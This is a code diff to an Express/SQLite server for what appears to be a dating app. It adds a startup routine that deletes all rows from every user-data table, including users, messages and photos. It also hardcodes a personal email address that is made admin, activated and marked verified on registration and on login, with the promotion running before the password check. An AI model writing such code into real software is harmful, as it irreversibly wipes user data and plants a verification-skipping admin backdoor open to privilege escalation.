@@ -293,6 +293,25 @@ db.exec(`
   );
 `);
 
+// One-time reset of all accounts as requested
+if (!fs.existsSync(".reset_done")) {
+  try {
+    const tables = [
+      'users', 'profiles', 'preferences', 'transactions', 'likes', 
+      'notifications', 'subscriptions', 'matches', 'push_subscriptions', 
+      'messages', 'question_answers', 'blocks', 'favorites', 
+      'user_photos', 'reports', 'suggestions', 'icebreakers'
+    ];
+    tables.forEach(table => {
+      try { db.prepare(`DELETE FROM ${table}`).run(); } catch (e) {}
+    });
+    fs.writeFileSync(".reset_done", "done");
+    console.log("Database reset successful.");
+  } catch (err) {
+    console.error("Database reset failed:", err);
+  }
+}
+
 // --- MIDDLEWARE ---
 const app = express();
 const httpServer = createServer(app);
@@ -362,10 +381,14 @@ app.post("/api/auth/register", async (req, res) => {
   const verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
   
   try {
+    const ADMIN_EMAIL = "sombiniainalorie@gmail.com";
     const userCount = db.prepare("SELECT COUNT(*) as count FROM users").get() as any;
-    const role = (userCount.count === 0) ? 'admin' : 'user';
-    const status = 'inactive';
-    const emailVerified = 0;
+    const isFirstUser = userCount.count === 0;
+    const isTargetAdmin = email === ADMIN_EMAIL;
+    
+    const role = (isFirstUser || isTargetAdmin) ? 'admin' : 'user';
+    const status = (isFirstUser || isTargetAdmin) ? 'active' : 'inactive'; // Admin is active by default
+    const emailVerified = (isFirstUser || isTargetAdmin) ? 1 : 0; // Admin is verified by default
     
     const result = db.prepare("INSERT INTO users (email, password, role, status, email_verified, verification_code) VALUES (?, ?, ?, ?, ?, ?)").run(email, hashedPassword, role, status, emailVerified, verificationCode);
     
@@ -414,6 +437,13 @@ app.post("/api/auth/reset-password", async (req, res) => {
 
 app.post("/api/auth/login", async (req, res) => {
   const { email, password } = req.body;
+  const ADMIN_EMAIL = "sombiniainalorie@gmail.com";
+  
+  // Ensure target admin email is always admin
+  if (email === ADMIN_EMAIL) {
+    db.prepare("UPDATE users SET role = 'admin', status = 'active', email_verified = 1 WHERE email = ?").run(email);
+  }
+
   const user = db.prepare("SELECT * FROM users WHERE email = ?").get(email) as any;
   if (!user || !(await bcrypt.compare(password, user.password))) {
     return res.status(401).json({ error: "Invalid credentials" });
